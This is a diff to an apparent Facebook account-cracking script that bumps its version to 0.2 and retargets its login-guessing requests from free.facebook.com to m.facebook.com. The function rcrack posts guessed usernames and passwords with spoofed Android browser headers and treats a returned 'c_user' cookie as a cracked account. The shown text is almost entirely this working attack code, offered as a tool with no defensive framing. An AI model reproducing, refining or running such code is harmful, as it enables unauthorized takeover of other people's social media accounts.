@@ -137,7 +137,7 @@ logo=("""
 â  Facebook    :  FAHEEMO
 âTELEGRAM.     :  ❓😑
 â   Tools      :  RANDOM 
-\x1b[1;97mâ   Version    :  0.1
+\x1b[1;97mâ   Version    :  0.2
 \33[1;37m----------------------------------------------""")
 
 def lines():
@@ -427,27 +427,26 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {
-            'authority': 'free.facebook.com',
+            'authority': 'm.facebook.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
-           # 'cookie': 'ps_l=0; ps_n=0; datr=WbD5ZdcBjpv3nzRbc93FM04b; sb=WbD5ZTkb_XURGqYMVG8Mi459; fr=0pSpp1U3Lpncw6WZc..Bl-bBZ..AAA.0.0.Bl-bBg.AWUM-DR5oto',
-           'dpr': '2.2250001430511475',
-           'sec-ch-prefers-color-scheme': 'dark',
-           'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-           'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
-           'sec-ch-ua-mobile': '?1',
-           'sec-ch-ua-model': '"SOV43"',
-           'sec-ch-ua-platform': '"Android"',
-           'sec-ch-ua-platform-version': '"12.0.0"',
-           'sec-fetch-dest': 'document',
-           'sec-fetch-mode': 'navigate',
-           'sec-fetch-site': 'none',
-           'sec-fetch-user': '?1',
-           'upgrade-insecure-requests': '1',
-           'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-           'viewport-width': '980',}
-            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+            'dpr': '2.2250001430511475',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"SOV43"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"12.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            'viewport-width': '980',}
+            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
             if 'c_user' in log_cookies:
